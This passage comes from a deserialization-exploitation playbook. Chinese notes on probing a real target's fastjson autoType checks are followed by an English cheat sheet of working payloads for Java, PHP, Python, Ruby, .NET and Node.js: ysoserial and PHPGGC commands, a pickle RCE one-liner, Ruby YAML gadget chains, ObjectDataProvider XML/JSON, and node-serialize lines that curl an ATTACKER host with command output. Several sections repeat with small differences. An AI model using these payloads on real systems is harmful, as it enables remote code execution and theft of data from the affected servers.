JSONObject jo = JSON.parse("{\"a\":{\"@type\":\"…geo.Feature\"}}");
jo.getObject("a", zzz.AppDto.class);
//  →  EXC  JSONException: can not cast to : zzz.AppDto     ★★ 回显应用 DTO 全限定名
jo.getObject("nokey", zzz.AppDto.class);
//  →  OK   null                                            ★★ 键名不存在 → 静默 null，不报错
```

**⇒ 教科书级的 oracle**：键名对 + 类型不匹配 ⇒ `can not cast to : <全限定名>`；键名不对 ⇒ **静默返回 null**。
**判据零假阳性**——只要出现 `can not cast to : X`，X 就是真的被以具体类型读取的应用类。

（另一个已知通道是 `type not match. X -> Y`，但它要「外层是我们指定且能过闸的类」才成立，
作用是**验证候选类名过不过闸**，不是钓应用类名。）

**③ 本目标实测：机制成立，目标不适用**

用目标自己前端 JS（`kagentapi.js`，110 KB）里的 **12 个真实业务字段名 + 1 个对照**逐个试（值全用 `geo.Feature`）：

| 键名 | bytes | `data` |
|---|---|---|
| `userid`/`password`/`name`/`email`/`taskid`/`id`/`path`/`filename`/`downloadurl`/`queryjsons`/`shareids`/`note` | **79** | 业务文案 |
| `zzzNoSuchKey9f3a`（对照） | **79** | 同 |

**13 发逐字节相同（含对照）** ⇒ 这些键**没有被任何具体类型读取** ⇒ **服务端对 `param` 是泛型读取**
（`getString`/`getJSONObject` 一类），**不存在 `getObject(key, XxxDto.class)`**。
**⇒ 钓应用类名在本目标上封死。**

★ **通用判据**：这个 oracle 只在「服务端把 JSON 用具体 DTO 承接」时可用。
先跑一次 `对键名不存在的对照`——若命中发与对照**同形**，说明不存在具体类型读取，这条路当场关掉，
**不要再去猜字段名**（会白烧几十上百发请求）。

#### ★ 「遍历应用自有类」为什么不做——两条独立的墙（2026-09-24 固化）

① **无字典**：类名空间 = 包名树 × 类名。外部可查的源逐个落空 ——
公开代码库（依赖 fastjson 的 jar 全集）带 `@JSONType` = **0** · fastjson 自带 11 个**全在内建表里** ·
目标前端 JS 只有业务字段名（**无包名/类名**）· 报错只回 `Throwable.getMessage()`（**never 堆栈**）· 包名猜测 7/7 未命中。

② **规模红线**：包名 4 层 × 每层 20 候选 × 类名 200 ≈ **3.2×10^6 次请求**。
执行纪律是**单发、低量（≤10 次/分）、非破坏性** ⇒ **这个量级不在允许范围内，任何情况下都不做**。
⇒ 结论口径应是「**打通它所需的那一样东西（一份带注解的类清单 + 字节码语义）不在我们可触及的一侧**」，
而**不是**「还没努力」或「打不通」。

★ 对应地，给信息持有方的自查是**三行命令级**的：
扫类级 `@JSONType` → 看有无危险 setter/构造链 → 特别看有无 `ClassLoader`/`DataSource`/`RowSet` 子类
（这三类的硬拦会被 `jsonType` 分支短路跳过）；**且要再追一层字段类型**（外层带注解时字段会被一起带过闸）。

★★ **deny 名单绕族在"白名单态"下全部失效**（这是最容易白费力气的一族）：
`LClassName;` 语法变形（≤1.2.47）· 二次反序列化/异常或集合触发嵌套（≤1.2.62）· 非公开类利用（≤1.2.80）·
接口伪装/`AutoCloseable` 作 expectClass（≤1.2.80，1.2.68 起逐步收紧）
—— **前三者都是"绕黑名单"**，而白名单态下**任何非内建类名都进不了检查范围**，到不了名单那一步；
**第四者要 `expectClass != null`**。⇒ 白名单态目标上**不必再找"某版本的 bypass"**。

★ **公开 PoC 的硬前置**（多源一致，别再被"复现成功"误导）：
`midisec/fastjson-1.2.83-gadget-rce` / `ThanatosXingYu/2026FastjsonPoC` 的验证环境**全是 Spring Boot fat-JAR**；
先知那篇干脆是**自己重打包了一个"能解析 URL 资源名"的 loader** 来模拟 ⇒ **反证真实环境必须有 fat-jar**；
`/proc/self/fd` 的 **fd 模式依赖 Linux，macOS/Windows 复现不了**；ThreatBook 在**内嵌 Tomcat** 上只拿到「远程 JAR 拉取 / SSRF」，
**外置 Tomcat WAR** 连这个都没有（官方明列不受影响）。

★★ **缓存投毒（CVE-2022-25845 型「同请求两字段」）的死亡线 = 1.2.48（2026-09-20 本地跨版本实测）**：
形态 `{"a":{"@type":"java.lang.Class","val":"X"},"b":{"@type":"X",…}}`。本机 JDK11 + 从 Maven 拉 jar + **无害替身**：
| 版本 | b 段 |
|---|---|
| 1.2.24 / **1.2.47** | ★ **放行**（`zzz.Probe` 真的被实例化、setter 被调；P2 里 `TemplatesImpl` 也被真实例化 —— JDK 打出 `Illegal reflective access … to constructor TemplatesImpl()`） |
| **1.2.48 / 1.2.68 / 1.2.75 / 1.2.80 / 1.2.83** | `autoType is not support. X` |
⇒ **目标 ≥1.2.68 ⇒ 该手法必然不成立**；且**目标侧同请求形态 4 发逐字节相同**（含 **顺序反转** 决定性对照）⇒
**缓存从未被写入**。★ 两个操作要点：① 替身要选**黑名单成员**（缓存命中路径在 deny 检查**之前**返回，
   所以"该放行却拒了"才是有信息量的那发）；② 必须做**同一请求内**的两字段形态（排除"两发不同 JVM"）。
★ **版本梯子纠错**：Maven Central 上 `1.2.81` / `1.2.82` **根本没有发布**（1.2.80 → 1.2.83 → 1.2.84）
⇒ 写「fastjson ≤1.2.82」是**不可能成立**的表述；正确写法：**区间 1.2.68–1.2.83，修复版 1.2.84**。
（本地对照脚本：`桌面/CTF/SRC收集/<任务>_SRC挖洞/复核/lab_cache_bypass/run.sh`）

#### ★ 由此固化的动作顺序

```
① 只读指纹确认组件**精确版本**（区间要落到"含不含端点版本"这一粒度）
② 查该组件**当前**公开 CVE（含"无补丁"的）：官方通告 / 阿里云 AVD / CVE 记录 / 厂商安全公告
③ 逐条比对**利用前提**：版本 ∩ 部署形态 ∩ 配置态 ∩ 入口可达性
   ★ 前提有一个不符 ⇒ **明确写"不适用"并点出是哪个前提不符**（这本身就是加分项）
④ 修复建议**以官方通告为准**；特别核查"升级到最新版"是否真的有效
   （已停维护的组件，结论常常是「升级无效，须改配置或迁移」）
```

★ 一句话：**组件类目标的定级与修复建议，不查公开 CVE 就是瞎写。**
★ 副产品：**排除论证**（"不适用，因为部署形态是 WAR 而非 fat-JAR"）本身就是报告里的**深度加分项** ——
证明分析落到了**前提层**，而不是只对版本号。

#### ★★ 「换其他载荷能不能救？」—— 载荷家族逐族判定（2026-09-20 补，datashare 亲例）

**原理一句话**：能不能执行我们的代码，取决于「**类名能不能进 `checkAutoType` 的检查范围**」，
**与载荷内容无关**。白名单态（`autoTypeSupport=false`）判的是**类名** ⇒ **换内容不换类名 = 什么都没换**。

| 家族 | 载荷要点 | 闸① WAF 类名规则 | 闸② 名单闸 | 亲例结局 |
|---|---|---|---|---|
| `TemplatesImpl` | `_bytecodes` 内嵌字节码 → `<clinit>` | ★ **501**（`event_id` 已生成） | — 没到 | 连应用层都到不了 |
| `JdbcRowSetImpl` + JNDI | `dataSourceName=ldap://…` + `autoCommit=true` | ✔ 放行（200 到应用层） | ★ **拒** `autoType is not support.` | ★★ **"WAF 放行 → 死在下一道"的实测证据** |
| BCEL / C3P0 / ROME / CC 系列 | 各自的字节码解码或 getter 链 | 未单独测 | ★ 必拒（同为非内建表类名） | 同上 |
| ★ `jar:http` + `@JSONType`（CVE-2026-16723） | `{"@type":"jar:http:..2130706433:19090.probe!.P"}` | `jar:` 关键字**可绕**（大小写/协议变体） | **绕开**名单闸 | 前置①不成立 ⇒ 不适用（见上文决策树） |

★★ **`@JSONType` 资源探测分支的一个硬边界：它不能用 DNS 观测**（本次新结论）——
`typeName.replace('.','/')` 对**整个字符串**生效 ⇒ **主机名里的点会被打成斜杠** ⇒
主机段只能写**整数 IP**（`2130706433`）或**单标签主机名**（`localhost`）。
⇒ **任何含点域名（含 `*.dnslog.cn`）写不进去** ⇒ 该链**只能用 HTTP Listener 观测**，与 DNS 无关。
（顺带：`jar:http://` 的类名含 `//`，native 层 `Class.forName → VerifyClassname → skip_over_fieldname` 直接拒；
`jar:file:/…` 单斜杠可过 —— 这就是"Tomcat 下 http 不灵、file 灵"的原因。）

★ **还剩唯一没测过的一环**：**闸①之后、闸②之前的 SSRF 阶段，在外置 Tomcat 的 `WebappClassLoader` 上成不成立？**
公开资料**互相矛盾**（CSDN 说外置 Tomcat WAR 不受影响；fearsoff 的复现里内嵌 Tomcat 下 jar **确实被拉下来了**，
失败在之后的 `Class.forName` 双斜杠；ThreatBook 也在内嵌 Tomcat 上只拿到 SSRF）。测法（**档①**）：
`{"\x4Jtype":"jar:http:..1696670378:60267.probe!.P"}`（整数 IP 指向自建 Listener，
**Listener 只记录连接、返回空/404、不下发任何 class**）⇒ 有连接 = **未授权 SSRF 成立**（比 DNS 原语高一档）；
无连接 = 「外置 Tomcat 下 SSRF 阶段亦不成立」，**同样是深度排除论证**。
★ 前置：需**公网可达的 Listener**（DNS 能出网 ≠ HTTP 能被回连）。

---

#### ★★ 白盒穷举法：内建表全集 = 86 个（2026-09-20）+ 全轴清点

**方法（可复用）**：`ParserConfig.checkAutoType` 是**纯本地纯函数**（只 `loadClass` + 查表，不实例化、不联网），
可低成本跑几万次 ⇒ 把类名空间整个过一遍，"能过闸的全集"就出来了。
工具 `EnumGate2.java`（从 `jrt:/modules` 取 JDK 全量类名 + jar 类名）。30,313 次耗时 **1.76 s**。

★ **判据必须先分清，否则数字全错**：

| `checkAutoType` 返回 | 含义 |
|---|---|
| **非 null** | ★ **真·过闸** |
| **null** | **不认这个 `@type`，当普通键处理** —— **不是放行**（目标侧自洽：`{"@type":"java.lang.Exception"}` → 得到保留 `@type` 字段的 `JSONObject`） |
| 抛异常 | DENY |

**结果：PASS 86 / NULL 803 / DENY 29,424。** 构成：`com.alibaba.fastjson.*` 16 ＋ `java.util.*` 集合 13 ＋
`java.util.concurrent.*` 11 ＋ `java.lang.*` 基本类型 16 ＋ **接口壳 7** ＋ `java.net.*` 5 ＋ 时间/文本/杂项 ~9 ＋ 其它 4。

★ **全 86 个里唯一有网络动作的仍然只有 `Inet4Address`/`Inet6Address`/`InetSocketAddress`（DNS）**，其余全是构造 / 查表 / 数据壳。

**内建"接口壳"一族（此前遗漏，2026-09-20 补测）**：

| 类名 | 闸 | 端到端 |
|---|---|---|
| `java.lang.AutoCloseable` | **PASS** | 生成 `com.sun.proxy.$Proxy0`，**`InvocationHandler` = `com.alibaba.fastjson.JSONObject`（硬编码，只做 map 取值）** ⇒ 无副作用 |
| `Closeable`/`Serializable`/`Comparable`/`Map`/`List` | PASS | `create instance error` |
| `Cloneable` | PASS | 落到 `java.util.HashMap` |
| `Runnable`/`Callable`/`Iterator`/`InvocationHandler`/`InputStream`/`OutputStream` | **DENY** | — |

⇒ ★ **「接口就放行」是错的**：`AutoCloseable` 能过是因为它**在内建表里**；同族接口 `Runnable`/`Callable` 全 DENY。

**双层 `@type`（`ThrowableDeserializer` 路径）白盒判死**：
```
checkAutoType("zzz.Probe", Throwable.class, 0)                      -> DENY autoType is not support.
checkAutoType("com.sun.rowset.JdbcRowSetImpl", Throwable.class, 0)  -> DENY autoType is not support.
checkAutoType("java.lang.AutoCloseable", Throwable.class, 0)        -> DENY type not match. ... -> java.lang.Throwable
```
★ 最后一行是**判据锚点**：`type not match` 只在 `loadClass` 成功后抛 ⇒ 证明 `AutoCloseable` 被 `loadClass` 了，
而 `Probe`/`JdbcRowSetImpl` **在 deny 名单处就抛**。⇒ **1.2.83 上 deny 名单在 `expectClass` 路径照旧生效。**

**`$ref`**：活的，但**只做值复用、不加载新类**——
`{"a":{"@type":"java.lang.Class","val":"java.lang.String"},"b":{"$ref":"$.a"}}` → `b` 得 `"java.lang.String"`。

**`@JSONType` 分支的单变量铁证**（此前归因不严谨）：自造 `zzz.Ann`（不在内建表 ＋ 带 `@JSONType`）
vs `zzz.Probe`（同位置、不带注解）：
- `zzz.Ann` → **PASS → 实例化 + `setX()` 被调**；`zzz.Probe` → **DENY**。**唯一变量就是注解** ⇒ 分支确实独立存在。
- ★ **但边界**：fastjson 自带的 11 个 `@JSONType` 类**全部同时在内建表里**（用不出这条分支），公开库 0 个
  ⇒ **目标上要触发它，只可能是应用自己写的 DTO**。

**★★ 目标配置被加固过的证据（2026-09-20）**：`java.util.regex.Pattern` 在**目标上被拒**
（91B `autoType is not support.`，**去掉 `val` 也拒 ⇒ 死在闸上**），而本地跨版本穷举显示它 **1.2.47 起一直 PASS**；
同时 `JSONPatch$Operation` 在目标上 PASS ⇒ **目标版本 ≥ 1.2.75**。两者不能同时成立
⇒ **目标在默认配置外追加了 deny**。
⇒ **教训：不能假定"目标内建表 = fastjson 默认表"，先做几发类名抽样校准。**

**换轴建议（`@type` 这条线穷举到底之后）**：
① 换入口（Cookie / Shiro `rememberMe` / Spring Session / 老网关 / 其它路由）；
② 换协议（Java 原生 `rO0AB` / Hessian / Kryo / XStream / SnakeYAML / Jackson `defaultTyping`）；
③ 不靠反序列化的等价效果（SpEL·OGNL / SSTI / JNDI / SQLi）——**常常比找 gadget 更快**。
★ 判据：**看特征前缀**（`rO0AB`、`AC ED 00 05`、`H`＋版本、Jackson 的 `Unrecognized field` 报错风格）。

## 3. PHP — unserialize AND PHAR

### Magic Method Chain

PHP deserialization triggers magic methods in order:

```
__wakeup()  → called immediately on unserialize()
__destruct() → called when object is garbage-collected
__toString() → called when object is used as string
__call()     → called for inaccessible methods
```

**Attack**: craft a serialized object whose `__destruct()` or `__wakeup()` triggers dangerous operations (file write, SQL query, command execution, SSRF).

### Serialized Object Format

```php
O:8:"ClassName":2:{s:4:"prop";s:5:"value";s:4:"cmd";s:2:"id";}
// O:LENGTH:"CLASS":PROP_COUNT:{PROPERTIES}
```

### phpMyAdmin Configuration Injection (Real-World Case)

phpMyAdmin `PMA_Config` class reads arbitrary files via `source` property:

```text
action=test&configuration=O:10:"PMA_Config":1:{s:6:"source";s:11:"/etc/passwd";}
```

### PHPGGC — PHP Gadget Chain Generator

```bash
# List available chains:
phpggc -l

# Generate payload (example: Laravel RCE):
phpggc Laravel/RCE1 system id

# Common chains:
# Laravel/RCE1-10
# Symfony/RCE1-4
# Guzzle/RCE1
# Monolog/RCE1-2
# WordPress/RCE1
# Slim/RCE1
```

### Phar Deserialization

Phar archives contain serialized metadata. Any file operation on a `phar://` URI triggers deserialization — even when `unserialize()` is never directly called.

**Triggering functions** (partial list):
```
file_exists()    file_get_contents()    fopen()
is_file()        is_dir()               copy()
filesize()       filetype()             stat()
include()        require()              getimagesize()
```

**Attack flow**:
1. Upload a valid file (e.g., JPEG with phar polyglot)
2. Trigger file operation: `file_exists("phar://uploads/avatar.jpg")`
3. PHP deserializes phar metadata → gadget chain executes

```bash
# Generate phar with PHPGGC:
phpggc -p phar -o exploit.phar Monolog/RCE1 system id
```

---

## 4. PYTHON — PICKLE

### __reduce__ Method

Python's `pickle.loads()` calls `__reduce__()` on objects during deserialization, which can return a callable + args:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(Exploit())
# Send payload to target that calls pickle.loads()
```

### Analyzing Pickle Opcodes

```python
import pickletools
pickletools.dis(payload)
# Shows opcodes: GLOBAL, REDUCE, etc.
# Look for GLOBAL referencing dangerous modules (os, subprocess, builtins)
```

### Common Python Deserialization Sinks

```python
pickle.loads(user_data)
pickle.load(file_handle)
yaml.load(data)           # PyYAML without Loader=SafeLoader
jsonpickle.decode(data)
shelve.open(path)
```

### Defensive Bypass: RestrictedUnpickler

Even when `RestrictedUnpickler.find_class` is used, check if the whitelist is too broad:

```python
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "builtins" and name in safe_builtins:
            return getattr(builtins, name)
        raise pickle.UnpicklingError(f"forbidden: {module}.{name}")
```

If `safe_builtins` includes `eval`, `exec`, or `__import__` → still exploitable.

---

## 5. DETECTION METHODOLOGY

```
Found binary blob or encoded object in request/cookie?
├── Java signature (ac ed / rO0AB)?
│   ├── Use URLDNS probe for safe confirmation
│   ├── Identify libraries (error messages, known product)
│   └── Try ysoserial chains matching identified libraries
│
├── PHP signature (O:N:"...)?
│   ├── Identify framework (Laravel, Symfony, WordPress)
│   ├── Try PHPGGC chains for that framework
│   └── Check for phar:// wrapper in file operations
│
├── Python (opaque binary, base64 blob)?
│   ├── Try pickle payload with DNS callback
│   └── Check if PyYAML unsafe load is used
│
└── Not sure?
    ├── Try URLDNS payload (Java) — check DNS
    ├── Try PHP serialized test string
    └── Monitor error messages for class loading failures
```

---

## 6. DEFENSE AWARENESS

| Language | Mitigation |
|---|---|
| Java | JEP 290 deserialization filters; whitelist allowed classes; avoid `ObjectInputStream` on untrusted data; use JSON/Protobuf instead |
| PHP | Avoid `unserialize()` on user input; use `json_decode()` instead; block `phar://` in file operations |
| Python | Use `pickle` only for trusted data; use `json` for external input; PyYAML: always use `yaml.safe_load()` |

---

## 7. QUICK REFERENCE — KEY PAYLOADS

```text
# Java — URLDNS confirmation
java -jar ysoserial.jar URLDNS "http://TOKEN.collab.net"

# Java — RCE via CommonsCollections
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned"

# PHP — Laravel RCE
phpggc Laravel/RCE1 system "id"

# PHP — Phar polyglot
phpggc -p phar -o exploit.phar Monolog/RCE1 system "id"

# Python — Pickle RCE
python3 -c "import pickle,os;print(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('id',))})()).hex())"

# Shiro default key test
rememberMe=<AES-CBC(key=kPH+bIxk5D2deZiIxcaaaA==, payload=ysoserial_output)>
```

---

## 8. RUBY DESERIALIZATION

### Ruby Marshal

- `Marshal.load` on untrusted data → RCE
- Fingerprint: binary data, no common text header
- Gadget chains exist for various Ruby versions
- Docker verification: hex payload via `[hex_string].pack("H*")`

### Ruby YAML (YAML.load)

- `YAML.load` (not `YAML.safe_load`) executes arbitrary Ruby objects
- **Pre Ruby 2.7.2**: `Gem::Requirement` chain → `git_set: id` / `git_set: sleep 600`
- **Ruby 2.x-3.x**: `Gem::Installer` → `TarReader` → `Kernel#system` chain (longer, multi-step)
- Always test: `YAML.load("--- !ruby/object:Gem::Installer\ni: x")` for class instantiation check
- Payload template:

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  type: :runtime
  specs:
    - !ruby/object:Gem::StubSpecification
      loaded_from: "|id"
```

- Note: `YAML.safe_load` is safe (Ruby 2.1+); `Psych.safe_load` also safe

---

## 9. .NET DESERIALIZATION

- **Traffic fingerprint**:
  - BinaryFormatter: hex `AAEAAD` (base64 `AAEAAAD/////`)
  - ViewState: hex `FF01` or `/w` prefix
  - JSON.NET: `$type` property in JSON
- **BinaryFormatter** (most dangerous, deprecated in .NET 5+): arbitrary type instantiation
- **XmlSerializer**: `ObjectDataProvider` + `XamlReader` chain for command execution

  ```xml
  <root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:od="http://schemas.microsoft.com/powershell/2004/04" type="System.Windows.Data.ObjectDataProvider">
    <od:MethodName>Start</od:MethodName>
    <od:MethodParameters><sys:String>cmd</sys:String><sys:String>/c calc</sys:String></od:MethodParameters>
    <od:ObjectInstance xsi:type="System.Diagnostics.Process"/>
  </root>
  ```

- **NetDataContractSerializer**: similar to BinaryFormatter, full type info in XML
- **LosFormatter**: used in ViewState, deserializes to `ObjectStateFormatter`
- **JSON.NET**: `$type` property enables type control → `ObjectDataProvider` + `ExpandedWrapper` chains

  ```json
  {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c calc"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
  ```

- **Tool**: `ysoserial.net` — generate payloads for all .NET formatters

  ```text
  ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc" -o base64
  ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc"
  ```

- **POP gadgets**: `ObjectDataProvider`, `ExpandedWrapper`, `AssemblyInstaller.set_Path`

---

## 10. NODE.JS DESERIALIZATION

- **node-serialize**: `unserialize()` with IIFE (Immediately Invoked Function Expression)
  - Payload marker: `_$$ND_FUNC$$_`
  - Add `()` at end to auto-execute:

  ```json
  {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('COMMAND')}()"}
  ```

- **funcster**: `__js_function` property → `constructor.constructor` to access `process`

  ```json
  {"__js_function":"function(){return global.process.mainModule.require('child_process').execSync('id').toString()}"}
  ```

- **cryo**: similar to funcster, serializes JS objects with function support

---

## RUBY DESERIALIZATION

### Marshal (Binary Format)
```ruby
# Ruby's Marshal.load is equivalent to Java's ObjectInputStream
# Any class with marshal_dump/marshal_load can be a gadget

# Detection: binary data starting with \x04\x08
# Or hex: 0408

# PoC gadget (requires vulnerable class in scope):
payload = "\x04\x08..." # hex-encoded gadget chain
Marshal.load(payload)    # triggers arbitrary code execution
```

### YAML.load (Critical — Most Common Ruby Deser Sink)
```ruby
# YAML.load (NOT YAML.safe_load) deserializes arbitrary Ruby objects

# Ruby <= 2.7.2 — Gem::Requirement chain:
# Triggers via !ruby/object constructor
---
!ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
    - !ruby/object:Gem::Source
      current_fetch_uri: !ruby/object:URI::Generic
        path: "| id"

# Ruby 2.x–3.x — Gem::Installer chain:
# Uses Gem::Installer → Gem::StubSpecification → Kernel#system
---
!ruby/hash:Gem::Installer
i: x
!ruby/hash:Gem::SpecFetcher
i: y
!ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
      read: 0
      header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
      socket: &1 !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          socket: !ruby/module 'Kernel'
          method_id: :system
        git_set: id    # <-- command to execute
      method_id: :resolve

# Safe alternative: YAML.safe_load (whitelist of allowed types)
```

### Tools
- `elttam/ruby-deserialization` — Ruby gadget chain generator
- `frohoff/ysoserial` inspiration → check Ruby-specific forks

---

## .NET DESERIALIZATION

### Traffic Fingerprinting

| Indicator | Serializer |
|---|---|
| Hex `00 01 00 00 00` / Base64 `AAEAAD` | BinaryFormatter |
| Hex `FF 01` / Base64 `/w` | DataContractSerializer |
| ViewState starts with `__VIEWSTATE` | LosFormatter / ObjectStateFormatter |
| JSON with `$type` property | JSON.NET (Newtonsoft) TypeNameHandling |
| XML with `<ObjectDataProvider>` | XmlSerializer / NetDataContractSerializer |

### BinaryFormatter / LosFormatter
```
# Most dangerous — arbitrary type instantiation
# Tool: ysoserial.net

ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "cmd /c whoami > C:\\out.txt" -o base64

# LosFormatter wraps BinaryFormatter — same gadgets work
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "calc.exe" -o base64
```

### XmlSerializer + ObjectDataProvider
```xml
<root>
  <ObjectDataProvider MethodName="Start" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation">
    <ObjectDataProvider.MethodParameters>
      <sys:String xmlns:sys="clr-namespace:System;assembly=mscorlib">cmd.exe</sys:String>
      <sys:String xmlns:sys="clr-namespace:System;assembly=mscorlib">/c whoami</sys:String>
    </ObjectDataProvider.MethodParameters>
    <ObjectDataProvider.ObjectInstance>
      <ProcessStartInfo xmlns="clr-namespace:System.Diagnostics;assembly=System">
        <ProcessStartInfo.FileName>cmd.exe</ProcessStartInfo.FileName>
        <ProcessStartInfo.Arguments>/c whoami</ProcessStartInfo.Arguments>
      </ProcessStartInfo>
    </ObjectDataProvider.ObjectInstance>
  </ObjectDataProvider>
</root>
```

### JSON.NET with TypeNameHandling
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c whoami"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```
Vulnerable when `TypeNameHandling` is set to `Auto`, `Objects`, `Arrays`, or `All`.

### Tools
- `pwntester/ysoserial.net` — primary .NET deserialization payload generator
- Gadget chains: TypeConfuseDelegate, TextFormattingRunProperties, PSObject, ActivitySurrogateSelectorFromFile

---

## NODE.JS DESERIALIZATION

### node-serialize (IIFE Pattern)
```javascript
// node-serialize uses eval() internally
// Payload uses _$$ND_FUNC$$_ marker + IIFE:

var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(error,stdout,stderr){console.log(stdout)});}()"}';

// The trailing () makes it an Immediately Invoked Function Expression
// When unserialize() processes this, it executes the function

// Full HTTP exploit (in cookie or body):
{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://ATTACKER/?x=$(id|base64)',function(e,o,s){});}()","email":"test@test.com"}
```

### funcster
```javascript
// funcster deserializes functions via constructor.constructor pattern:
{"__js_function":"function(){var net=this.constructor.constructor('return require')()('child_process');return net.execSync('id').toString();}"}
```

### PHP create_function + Deserialization Combo
```php
// When a PHP class uses create_function in __destruct or __wakeup:
// Serialize an object where:
$a = "create_function";
$b = ";}system('id');/*";
// The lambda body becomes: function(){ ;}system('id');/* }
// Closing the original function body and injecting a command

// In serialized form, private properties need \0ClassName\0 prefix:
O:7:"Noteasy":2:{s:19:"\0Noteasy\0method_name";s:15:"create_function";s:14:"\0Noteasy\0args";s:21:";}system('id');/*";}
```

---

## 11. RUBY DESERIALIZATION

### Marshal
```ruby
# Ruby's native serialization. Dangerous when deserializing untrusted data.
# Detection: Binary data starting with \x04\x08

# One-liner gadget verification (hex-encoded payload):
payload = ["040802"].pack("H*")  # Minimal Marshal header
Marshal.load(payload)
```

### YAML (CVE-rich surface)
```ruby
# YAML.load is DANGEROUS — equivalent to eval for Ruby objects
# Safe alternative: YAML.safe_load

# Ruby <= 2.7.2: Gem::Requirement chain
--- !ruby/object:Gem::Requirement
requirements:
  - !ruby/object:Gem::DependencyList
    specs:
    - !ruby/object:Gem::Source
      uri: "| id"

# Ruby 2.x-3.x: Gem::Installer chain (more complex)
# Triggers: git_set → Kernel#system
--- !ruby/object:Gem::Installer
i: x
# (Full chain available in ysoserial-ruby / blind-ruby-deserialization)

# Universal detection: supply YAML that triggers DNS callback
--- !ruby/object:Gem::Fetcher
uri: http://BURP_COLLAB/
```

**Tools**: `elttam/ruby-deserialization`, `mbechler/ysoserial` (Ruby variant)

---

## 12. .NET DESERIALIZATION

### Fingerprinting
| Magic Bytes | Format |
|---|---|
| `AAEAAD` (base64) / `00 01 00 00 00` (hex) | BinaryFormatter |
| `FF 01` or `/w` (base64) | ViewState (ObjectStateFormatter) |
| `<` (XML opening) | XmlSerializer / DataContractSerializer |
| JSON with `$type` key | JSON.NET (TypeNameHandling enabled) |

### BinaryFormatter (most dangerous)
```
# Always dangerous when deserializing untrusted data
# Tool: ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "whoami" -o base64
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c "calc" -o raw
```

### ViewState (ASP.NET)
```
# If __VIEWSTATE is not MAC-protected (enableViewStateMac=false):
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --validationalg="SHA1" --validationkey="KNOWN_KEY"

# Leak machineKey from web.config (via LFI/backup) → forge ViewState
```

### XmlSerializer + ObjectDataProvider
```xml
<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
      xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <ObjectDataProvider MethodName="Start">
    <ObjectInstance xsi:type="Process">
      <StartInfo>
        <FileName>cmd.exe</FileName>
        <Arguments>/c whoami</Arguments>
      </StartInfo>
    </ObjectInstance>
  </ObjectDataProvider>
</root>
```

### JSON.NET ($type abuse)
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd.exe",
      "Arguments": "/c whoami"
    }
  }
}
```
Vulnerable when `TypeNameHandling != None` in JSON deserialization settings.

### Tools
- `pwntester/ysoserial.net` — primary .NET gadget chain generator
- `NotSoSecure/Blacklist3r` — decrypt/forge ViewState with known machineKey

---

## 13. NODE.JS DESERIALIZATION

### node-serialize (IIFE injection)
```javascript
// Vulnerable pattern:
var serialize = require('node-serialize');
var obj = serialize.unserialize(userInput);

// Payload: IIFE (Immediately Invoked Function Expression)
// The _$$ND_FUNC$$_ prefix signals a serialized function
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)})}()"}

// Key: the () at the end causes immediate execution upon deserialization
```

### funcster
```javascript
// Vulnerable: funcster.deepDeserialize(userInput)
// Payload uses __js_function to inject via constructor chain:
{"__js_function":"function(){var net=this.constructor.constructor('return this')().process.mainModule.require('child_process');return net.execSync('id').toString()}()"}
```

### PHP create_function + Deserialization Combo
```php
// When create_function is available and object is deserialized:
// Payload creates lambda with injected code:
$a = "create_function";
$b = ";}system('id');/*";
// The lambda body becomes: function anonymous() { ;}system('id');/* }
// Effective: close original body, inject command, comment out rest

// In serialized form (with private property \0ClassName\0):
O:8:"ClassName":2:{s:13:"\0ClassName\0func";s:15:"create_function";s:12:"\0ClassName\0arg";s:18:";}system('id');/*";}
```


---


## 附件：JAVA_GADGET_CHAINS

# Java Gadget Chains & Cross-Language Deserialization Deep Dive


## 1. JAVA GADGET CHAIN VERSION COMPATIBILITY MATRIX

### 1.1 CommonsCollections Chains

| Chain | Library | Version Range | JDK Constraint | Execution Type |
|---|---|---|---|---|
